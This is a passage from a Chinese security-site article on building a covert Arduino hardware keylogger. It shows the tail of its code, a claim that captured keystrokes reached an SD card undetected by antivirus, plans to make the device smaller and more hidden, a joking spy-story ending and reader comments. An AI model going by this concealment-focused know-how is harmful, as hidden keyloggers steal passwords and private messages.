112.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Keyboard.release(c);
113.&nbsp;&nbsp;&nbsp;}</pre>
<p><span id="_baidu_bookmark_start_265" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_267" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_269" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_271" style="display: none; line-height: 0px;">‍</span>把上面的程序编译并下载到arduino运行，键盘输入的字符被成功的记录到了SD卡中，而杀毒软件没有任何的反应:<span id="_baidu_bookmark_end_272" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_270" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_268" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_266" style="display: none; line-height: 0px;">‍</span></p>
<p style="background: white; margin: 5px 0px; text-align: center; line-height: 26px;"><img data-original="http://image.3001.net/images/ue/20211423968858.png" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></p>
<noscript><img src="http://image.3001.net/images/ue/20211423968858.png"/></p></noscript>
<p style="background: white; margin: 15px 0px 5px; line-height: 26px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"></span></p>
<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong><span id="_baidu_bookmark_start_273" style="display: none; line-height: 0px;">‍</span></strong></span><span id="_baidu_bookmark_start_275" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>0×06 需要改进的地方</strong></span><span id="_baidu_bookmark_end_276" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong><span id="_baidu_bookmark_end_274" style="display: none; line-height: 0px;">‍</span></strong></span><br/></p>
<pre class="prettyprint lang-html">1.&nbsp;实现的功能键还不完整，比如三键组合还没实现，需要进一步开发.
2.&nbsp;不能一直用杜邦线连接PS2口，这样既不方便也不隐蔽，下一步要用PS2母口连接.
3.&nbsp;目前是从PS2输入，连接计算机是USB输出，下一步要实现连接计算机也用PS2.
4.&nbsp;体积还有点大，正在研究用U盘大小的Arduinopromini替换leonardo.</pre>
<p style="margin-top: 15px;"><span style="color: rgb(0, 176, 80); font-size: 18px;"><strong>结尾</strong></span></p>
<p style="margin-top: 15px;"><span id="_baidu_bookmark_start_295" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_297" style="display: none; line-height: 0px;">‍</span>在又一个阳光明媚的周末，刘尼玛随着晨练的人群来到了江边，今天组织将派人与他接头，交给他所需要的东西，接头人代号叫冷爱。刘尼玛一边在江边踱着步，一边焦急的等待，这时，一辆黑色的轿车缓缓停在了不远处，从车上下来一位身穿紧身皮衣，高挑性感的美女，径直走向了刘尼玛，刘尼玛的心砰砰直跳，他用一只手捂着鼻子，防止鼻血喷出来，另一只手放在了胸口。</p>
<pre class="prettyprint lang-html">“你穿什么样的内裤？”&nbsp;美女来到刘尼玛的身边，冷冷的问道，这是约好的接头暗号。
“粉红色的平角裤头。”&nbsp;刘尼玛回答道。
美女点了点头，把手中的一个小盒子交给了刘尼玛，刘尼玛心里狂喜着：“原来冷爱是个大美女啊，待会要想办法约她吃饭。”</pre>
<p style="margin-top: 15px;"><span style="color: rgb(0, 176, 80);">不料冷爱送完盒子转身就走，连头也不回，刘尼玛想要叫住她，她已经上了车，扬长而去….，留下怅然若失的刘尼玛一个人在江边站了良久。</span><span id="_baidu_bookmark_end_298" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_296" style="display: none; line-height: 0px;">‍</span><br/></p>
<p><span style="color: rgb(38, 38, 38);"><strong><span id="_baidu_bookmark_start_299" style="display: none; line-height: 0px;">‍</span></strong></span><span id="_baidu_bookmark_start_301" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38);"><strong>版权声明：此文章作者为红客联盟(cnhoneker.com)攻防版区版主b41k3r所写，经b41k3r同意发到Freebuf，所有带色内容与转载小可爱无关~~</strong></span><span id="_baidu_bookmark_end_302" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38);"><strong><span id="_baidu_bookmark_end_300" style="display: none; line-height: 0px;">‍</span></strong></span></p>
<p><span style="color: rgb(255, 0, 0);"><strong>[作者/b41k3r，转载请注明来自FreeBuf黑客与极客（FreeBuf.COM）]</strong></span></p>
                                                    </div>
                        <div class="article-oper article-oper-new">
                            <style>
                                @font-face {font-family: 'iconfont';
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot'); /* IE9*/
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
                                    url('http://static.3001.net/iconfonts/iconfont.woff') format('woff'), /* chrome、firefox */
                                    url('http://static.3001.net/iconfonts/iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
                                    url('http://static.3001.net/iconfonts/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
                                }
                            </style>
                            <div class="share-new clearfix">
                                <div class="share-author">
                                                                            <a href="http://www.freebuf.com/author/banish" title="由 banish 发布" rel="author">
                                            <img src="http://image.3001.net/2016/02/img-deb2308e581acc70843c632c719a2b47_1.jpg" width="50" height="46" alt="banish" class="avatar avatar-50 wp-user-avatar wp-user-avatar-50 photo" />                                            <!--							<img src="http://image.3001.net/2015/06/17.jpg" alt="ArthurKiller">-->
                                        </a>
                                        <div class="share-author-info">
                                                                                        <a class="author-name" href="http://www.freebuf.com/author/banish">banish</a>
                                            <!--<span class="icon-f"></span>-->
                                            <span>
                                <i class="colour-red">
                                    32                                </i>
                                篇文章</span>
                                            <span>等级：
                                <i class="colour-green">6</i>级
                            </span>
                                        </div>
                                                                                                        </div>
                                <div class="user-center clearfix">
                                                                            <a href="http://www.freebuf.com/author/banish" data-toggle="tooltip" data-placement="top" title="个人主页" class="home" target="_blank"></a>
                                                                        <a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=banish" data-toggle="tooltip" data-placement="top" title="私信" class="letter" target="_blank"></a>
                                </div>
                                <div class="share-ctrl clearfix">
                                                                        <div class="bdsharebuttonbox clearfix bdshare-button-style1-24 columnstatus"
                                         data-bd-bind="1489991449190" data-column="" data-title="间谍游戏：用Arduino制作硬件键盘记录器" data-name="">
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="tsina" title="分享到新浪微博" id="tsina"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="weixin" title="分享到微信" id="weixin"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="qzone" title="分享到QQ空间" id="qzone"></a>
                                       <!-- _shareUrlWeibo = 'http://service.weibo.com/share/share.php?url=http://'+encodeURIComponent(_json[i].url)+'&title='+encodeURIComponent(_json[i].title)+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareUrlZone = 'http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://'+encodeURIComponent(_json[i].url)+'&title='+_json[i].title+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareSrc = 'http://s.jiathis.com/qrcode.php?url=http://'+_json[i].url;-->
                                        <span class="share-line">|</span>
                                    </div>
                                </div>
                                <div class="user-ctrl clearfix">
                                                                            <a href="http://www.freebuf.com/oauth" id="collect" data-toggle="tooltip" data-placement="top" title="收藏" ></a>
                                                                        <a href="#respond" data-toggle="tooltip" data-placement="top" title="评论" id="comments"></a>
                                                                        <!--					<a href="#" title="文章纠正">&#xe6e3;</a>-->
                                    <span class="share-line">|</span>
                                    <span class="info-alert"></span>
                                </div>
                            </div>
                            <script>
                                var column = $('.columnstatus').attr('data-column');
                                var text = '';
                                if(column){
                                    var title = $('.columnstatus').attr('data-title');
                                    var name = $('.columnstatus').attr('data-name');
                                    text = title+' - FreeBuf专栏·'+name;
                                }
                                window._bd_share_config={
                                    "common": {
                                        "bdSnsKey": {},
                                        "bdText": text,
                                        "bdMini": "2",
                                        "bdMiniList": ["qzone", "tsina", "weixin"],
                                        "bdPic": "",
                                        "bdStyle": "1",
                                        "bdSize": "24"
                                    },
                                    "share":{},
                                };
                                with(document)0[
                                    (getElementsByTagName('head')[0]||body).
                                    appendChild(createElement('script')).
                                        src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)
                                    ];
                                //控制垂直方向分享模块的定位
                                function shareFixVertical(){
                                    var offsetTop = jQuery(".article-oper").get(0).offsetTop;
                                    var win_h = jQuery(window).height();
                                    var win_w = jQuery(window).width();
                                    var scrollTop = document.body.scrollTop||document.documentElement.scrollTop;
                                    var _height = offsetTop-scrollTop;
                                    var _flag = $('.column-article').attr('data-column');
                                    if(_flag == 1) {
                                        if(_height>=win_h-660&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }else {
                                        if(_height>=win_h-255&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }
                                }
                                //控制水平方向分享模块的定位
                                function shareFixHorizontal(){
                                    var _width = jQuery("#getWidth").innerWidth()-30;
                                    var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                    var win_w = document.documentElement.clientWidth || document.body.clientWidth;
                                    jQuery(".fixed").css({
                                        width:_width,
                                        left:_left
                                    });
                                    if(win_w< 975){
                                        jQuery(".share-new").css({
                                            width: "100%",
                                            left: "0"
                                        });
                                    }else{
                                        var _width = jQuery("#getWidth").innerWidth()-30;
                                        var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                        jQuery(".fixed").css({
                                            width:_width,
                                            left:_left
                                        });
                                    }
                                }
                                function click(){
                                    var _w = jQuery(window).width();
                                    jQuery(document).click(function(e){
                                        if(jQuery(e.target).attr("id")=="weixin"){
                                            if(_w <= 760) {
                                                jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                                layer.open({
                                                    title: '提示',
                                                    btnAlign: 'c',
                                                    content: '请使用手机浏览器自带的分享功能分享该页面',
                                                    area: '260px'
                                                });
                                            }else {
                                                jQuery("#bdshare_weixin_qrcode_dialog").show();
                                            }
                                        }else {
                                            jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                        }
                                    });
                                }

                                jQuery(window).on("load",function(){
                                    shareFixVertical();
                                    click();
                                });

                                jQuery(window).on("scroll",function(){
                                    //判断滚轮方向
                                    var agent = navigator.userAgent;
                                    if (/.*Firefox.*/.test(agent)) {
                                        document.addEventListener("DOMMouseScroll", function(e) {
                                            e = e || window.event;
                                            var detail = e.detail;
                                            if (detail > 0) {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            } else {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            }
                                        });
                                    } else {
                                        document.onmousewheel = function(e) {
                                            e = e || window.event;
                                            var wheelDelta = e.wheelDelta;
                                            if (wheelDelta > 0) {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            } else {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            }
                                        }
                                    }
                                });


                                jQuery(window).on("resize",function(){
                                    shareFixHorizontal();
                                    click();
                                })

                                //tooltips提示
                                $(function () { $("[data-toggle='tooltip']").tooltip(); });
                            </script>
                        </div>
                                                                                                                            <div class="article-pager ">
                                <ul>
                                    <li class="previous"><span>上一篇：</span><a href="http://www.freebuf.com/articles/web/59071.html" rel="prev">如何科学的抢红包第二弹</a>                                    </li>
                                    <li class="next"><span>下一篇：</span>
                                        <a href="http://www.freebuf.com/articles/web/59150.html" rel="next">IP.Board CMS恶意重定向分析</a>                                    </li>
                                </ul>
                            </div>
                                            </div>
                </div>
                    <div class="comment-bright"><div class="main-tit04">
    <h3>这些评论亮了</h3></div>      <ul>      <li>
            <div class="user_photo">             <img src="http://image.3001.net/images/headimg/pic15.png">             </div>
            <div class="tit"><span class="name"> 脑残粉 </span> 
						<span class="explain"></span>
			<span class="reply"><a onclick="return addComment.moveForm( 'comment-','', 'respond','59045' ) " href="?replytocom=#respond" class="comment-reply-link" rel="nofollow">回复</a></span></div>
            <div class="txt">
						我方军犬出动。<br/><a href=http://img.my.csdn.net/uploads/201306/19/1371636818_1665.jpg target="_blank" title="" data_ue_src=http://img.my.csdn.net/uploads/201306/19/1371636818_1665.jpg class="highslide-image" onclick="return hs.expand(this);"><strong style="color: rgb(38, 38, 38);"><strong><img data-original=http://img.my.csdn.net/uploads/201306/19/1371636818_1665.jpg src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></strong></strong></a></div>
            <div class="but"><span class="vote-count">)</span><span style="none" id="cos_support-264622" class="vote-count">30</span><span class="vote-count">(</span><span class="vote">  <a class="ilike_icon" id="vote4-264622" href="javascript:acv_vote(64622,1,2);">亮了</a></span></div>
          </li>
            <li>
            <div class="user_photo"> <a href="http://www.freebuf.com/author/b41k3r">
            <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png" width="58" height="58" /></a>
             </div>
            <div class="tit"><span class="name"> <a href="http://www.freebuf.com/author/b41k3r" target="_blank">b41k3r</a>  </span> 
						<span class="icon-f">  </span> 
			<span class="rank">(2级)</span>
						<span class="explain"></span>
			<span class="reply"><a onclick="return addComment.moveForm( 'comment-','', 'respond','59045' ) " href="?replytocom=#respond" class="comment-reply-link" rel="nofollow">回复</a></span></div>
            <div class="txt">
						@ EvRL1928    乃真的看错了，有人转了别人文章不注明出处，还要无耻的加上自己版权，更奇怪的是还被人相信他是原创。</div>
            <div class="but"><span class="vote-count">)</span><span style="none" id="cos_support-264632" class="vote-count">17</span><span class="vote-count">(</span><span class="vote">  <a class="ilike_icon" id="vote4-264632" href="javascript:acv_vote(64632,1,2);">亮了</a></span></div>
          </li>
         </ul></div><div class="comment-list">
      <div class="main-tit02">
		<a rel="nofollow" class="btnbtn-default btn-comment" href="#respond">发表评论</a>
        <h3>已有 <span class="color_red">21</span> 条评论
      </div>
      <ul>
         <li class="comment even thread-even depth-1" id="li-comment-64622">
    <div id="comment-64622">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic2.png">     </div>
    <div class="tit"> 
	    <span class="name"> 脑残粉 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-64622','64622', 'respond','59045' ) " href="?replytocom=64622#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">1楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>我方军犬出动。<br />
<a href=http://img.my.csdn.net/uploads/201306/19/1371636818_1665.jpg target="_blank" title="" data_ue_src=http://img.my.csdn.net/uploads/201306/19/1371636818_1665.jpg class="highslide-image" onclick="return hs.expand(this);"><strong style="color: rgb(38, 38, 38);"></strong><strong><img data-original=http://img.my.csdn.net/uploads/201306/19/1371636818_1665.jpg data-original="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></strong></a></p>
<noscript><img data-original=http://img.my.csdn.net/uploads/201306/19/1371636818_1665.jpg src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></noscript>
<div class="comment-tools">
<div class="vote" id="vote-64622"><span id="acv_stat_64622"></span><a class="ilike_icon"  id="vote4-64622" href="javascript:acv_vote(64622,1);">亮了</a>(<span id="cos_support-64622">30</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64622" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64622" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64622" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64622" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64622" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment odd alt depth-2" id="li-comment-64624">
    <div id="comment-64624">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic17.png">     </div>
    <div class="tit"> 
	    <span class="name"> 咸 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-64624','64624', 'respond','59045' ) " href="?replytocom=64624#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ 脑残粉  咸完爆<br />
<a href=http://imgsrc.baidu.com/forum/w%3D580/sign=f88aff2519950a7b75354ecc3ad0625c/ddb42d9b033b5bb57d6884ed32d3d539b700bce3.jpg target="_blank" title="" data_ue_src=http://imgsrc.baidu.com/forum/w%3D580/sign=f88aff2519950a7b75354ecc3ad0625c/ddb42d9b033b5bb57d6884ed32d3d539b700bce3.jpg class="highslide-image" onclick="return hs.expand(this);"><strong style="color: rgb(38, 38, 38);"></strong><strong><img data-original=http://imgsrc.baidu.com/forum/w%3D580/sign=f88aff2519950a7b75354ecc3ad0625c/ddb42d9b033b5bb57d6884ed32d3d539b700bce3.jpg data-original="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></strong></a></p>
<noscript><img data-original=http://imgsrc.baidu.com/forum/w%3D580/sign=f88aff2519950a7b75354ecc3ad0625c/ddb42d9b033b5bb57d6884ed32d3d539b700bce3.jpg src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></noscript>
<div class="comment-tools">
<div class="vote" id="vote-64624"><span id="acv_stat_64624"></span><a class="ilike_icon"  id="vote4-64624" href="javascript:acv_vote(64624,1);">亮了</a>(<span id="cos_support-64624">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64624" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64624" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64624" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64624" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64624" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment byuser comment-author-evrl1928 even thread-odd thread-alt depth-1" id="li-comment-64631">
    <div id="comment-64631">
        <div class="photo"> <a href="http://www.freebuf.com/author/EvRL1928">
    <img src="http://image.3001.net/2015/07/SFGCDRJ3X_GUQQ_MY1.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/EvRL1928" target="_blank">EvRL1928&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(3级)</span>
				<span class="explain"> 低调 </span>
		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-64631','64631', 'respond','59045' ) " href="?replytocom=64631#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">2楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>mb,一定是我看错了<br />
http://www.ailawuyou.com/physics/526.html</p>
<div class="comment-tools">
<div class="vote" id="vote-64631"><span id="acv_stat_64631"></span><a class="ilike_icon"  id="vote4-64631" href="javascript:acv_vote(64631,1);">亮了</a>(<span id="cos_support-64631">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64631" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64631" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64631" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64631" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64631" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment byuser comment-author-b41k3r odd alt depth-2" id="li-comment-64632">
    <div id="comment-64632">
        <div class="photo"> <a href="http://www.freebuf.com/author/b41k3r">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/b41k3r" target="_blank">b41k3r&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(2级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-64632','64632', 'respond','59045' ) " href="?replytocom=64632#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ EvRL1928    乃真的看错了，有人转了别人文章不注明出处，还要无耻的加上自己版权，更奇怪的是还被人相信他是原创。</p>
<div class="comment-tools">
<div class="vote" id="vote-64632"><span id="acv_stat_64632"></span><a class="ilike_icon"  id="vote4-64632" href="javascript:acv_vote(64632,1);">亮了</a>(<span id="cos_support-64632">17</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64632" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64632" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64632" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64632" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64632" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even depth-2" id="li-comment-64635">
    <div id="comment-64635">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic4.png">     </div>
    <div class="tit"> 
	    <span class="name"> 内幕人士 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-64635','64635', 'respond','59045' ) " href="?replytocom=64635#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ EvRL1928    作者出现了，版权喷子们退散</p>
<div class="comment-tools">
<div class="vote" id="vote-64635"><span id="acv_stat_64635"></span><a class="ilike_icon"  id="vote4-64635" href="javascript:acv_vote(64635,1);">亮了</a>(<span id="cos_support-64635">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64635" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64635" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64635" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64635" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64635" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-banish bypostauthor odd alt depth-2" id="li-comment-64636">
    <div id="comment-64636">
        <div class="photo"> <a href="http://www.freebuf.com/author/banish">
    <img src="http://image.3001.net/2016/02/img-deb2308e581acc70843c632c719a2b47_1.jpg"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/banish" target="_blank">banish&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(6级)</span>
				<span class="explain"> 天地不仁 万物刍狗 </span>
		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-64636','64636', 'respond','59045' ) " href="?replytocom=64636#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ EvRL1928    那个绝对是侵权&#8230;</p>
<div class="comment-tools">
<div class="vote" id="vote-64636"><span id="acv_stat_64636"></span><a class="ilike_icon"  id="vote4-64636" href="javascript:acv_vote(64636,1);">亮了</a>(<span id="cos_support-64636">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64636" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64636" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64636" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64636" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64636" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment even thread-even depth-1" id="li-comment-64633">
    <div id="comment-64633">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic10.png">     </div>
    <div class="tit"> 
	    <span class="name"> 戈壁王大妈 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2015-02-15</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-64633','64633', 'respond','59045' ) " href="?replytocom=64633#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">3楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>气急败坏的老总用谁也听不懂的家乡土话骂了主管的七舅老爷和八姨夫等等各种八竿子打不着的亲戚，憋了一肚子火憋得蛋疼的主管在挨完骂之后立马把电话打给了罪魁祸首刘尼玛，于是刘尼玛的各种八竿子打不着的亲戚外加十八代祖宗也被牵连了…</p>
<p>谁也听不懂的话你又是如何知道的&#8230;</p>
<div class="comment-tools">
<div class="vote" id="vote-64633"><span id="acv_stat_64633"></span><a class="ilike_icon"  id="vote4-64633" href="javascript:acv_vote(64633,1);">亮了</a>(<span id="cos_support-64633">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="64633" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="64633" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="64633" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="64633" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="64633" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment byuser comment-author-banish bypostauthor odd alt depth-2" id="li-comment-64637">
    <div id="comment-64637">
        <div class="photo"> <a href="http://www.freebuf.com/author/banish">
    <img src="http://image.3001.net/2016/02/img-deb2308e581acc70843c632c719a2b47_1.jpg"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/banish" target="_blank">banish&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(6级)</span>
				<span class="explain"> 天地不仁 万物刍狗 </span>
